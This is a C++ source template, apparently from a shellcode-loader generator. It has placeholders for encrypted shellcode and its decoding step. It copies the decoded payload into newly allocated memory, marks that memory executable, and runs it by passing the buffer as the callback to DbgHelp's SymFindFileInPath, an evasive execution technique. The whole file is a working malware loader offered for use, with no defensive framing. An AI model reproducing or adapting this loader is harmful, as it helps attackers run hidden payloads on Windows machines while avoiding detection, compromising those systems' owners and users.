#include <windows.h>
#include <stdio.h>
#include "base64.h"
#include "syscall.h"


#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {

	HANDLE hProcess = ::GetCurrentProcess();

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);
	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	::SymInitialize(hProcess, NULL, TRUE);

	SYMSRV_INDEX_INFO finfo;
	::SymSrvGetFileIndexInfo("c:\\windows\\system32\\kernel32.dll", &finfo, NULL);

	char dummy[MAX_PATH];


	::SymFindFileInPath(hProcess, "c:\\windows\\system32", "kernel32.dll", &finfo.timestamp, finfo.size, 0, SSRVOPT_DWORDPTR, dummy, (PFINDFILEINPATHCALLBACK)addr, NULL);


	return 0;

}